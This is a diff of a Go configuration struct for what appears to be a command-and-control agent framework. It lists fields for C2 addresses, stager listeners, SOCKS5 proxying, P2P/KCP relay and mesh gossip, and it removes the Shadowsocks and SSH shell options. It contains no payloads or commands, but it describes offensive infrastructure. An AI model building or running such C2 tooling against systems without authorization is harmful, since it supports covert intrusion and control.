@@ -85,22 +85,19 @@ type MalleableHTTPConfig struct {
 
 // Config build.json config file
 type Config struct {
-	CCAddress                 string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
-	CCHost                    string `cbor:"2,keyasint"`  // Hostname of C2 server (hostname only)
-	CCH2Port                  string `cbor:"3,keyasint"`  // CC service port, TLS enabled
-	AgentSocksServerPort      string `cbor:"4,keyasint"`  // agent side socks5 proxy server port
-	AgentSocksTimeout         int    `cbor:"5,keyasint"`  // timeout (in seconds) for agent side Socks5 server, 0 to disable
-	StagerHTTPListenerPort    string `cbor:"6,keyasint"`  // For stager HTTP server
-	Password                  string `cbor:"7,keyasint"`  // password of shadowsocks, socks5 and SSH server
-	ShadowsocksLocalSocksPort string `cbor:"8,keyasint"`  // socks5 port of shadowsocks
-	ShadowsocksServerPort     string `cbor:"9,keyasint"`  // server port of shadowsocks proxy server, can run on CC and agent
-	P2PRelayPort              string `cbor:"10,keyasint"` // port of p2p relay transport, also used as KCP server port
-	KCPClientPort             string `cbor:"11,keyasint"` // client port of kcp
-	UseKCP                    bool   `cbor:"12,keyasint"` // enable KCP for Shadowsocks C2 transport
-	EnableNCSI                bool   `cbor:"13,keyasint"` // NCSI connectivity checking, disable when C2 is reachable but NCSI is not
-	SSHHostKey                []byte `cbor:"14,keyasint"` // SSH host (private) key (PEM string), used by remote forwarding server
-	SSHDShellPort             string `cbor:"16,keyasint"` // interactive shell
-	MeshGossipPort            string `cbor:"17,keyasint"` // UDP/TCP port for gossip (memberlist)
+	CCAddress              string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
+	CCHost                 string `cbor:"2,keyasint"`  // Hostname of C2 server (hostname only)
+	CCH2Port               string `cbor:"3,keyasint"`  // CC service port, TLS enabled
+	AgentSocksServerPort   string `cbor:"4,keyasint"`  // agent side socks5 proxy server port
+	AgentSocksTimeout      int    `cbor:"5,keyasint"`  // timeout (in seconds) for agent side Socks5 server, 0 to disable
+	StagerHTTPListenerPort string `cbor:"6,keyasint"`  // For stager HTTP server
+	Password               string `cbor:"7,keyasint"`  // pre-shared key for P2P/KCP transport encryption and agent file crypto
+	Socks5LocalPort        string `cbor:"8,keyasint"`  // local SOCKS5 port of the operator auto-proxy
+	P2PRelayPort           string `cbor:"10,keyasint"` // port of p2p relay transport, also used as KCP server port
+	KCPClientPort          string `cbor:"11,keyasint"` // client port of kcp
+	UseKCP                 bool   `cbor:"12,keyasint"` // enable KCP for the C2 transport
+	EnableNCSI             bool   `cbor:"13,keyasint"` // NCSI connectivity checking, disable when C2 is reachable but NCSI is not
+	MeshGossipPort         string `cbor:"17,keyasint"` // UDP/TCP port for gossip (memberlist)
 	// Preflight Config
 	PreflightEnabled bool              `cbor:"20,keyasint"` // Enable preflight check
 	PreflightURL     string            `cbor:"21,keyasint"` // URL for preflight check
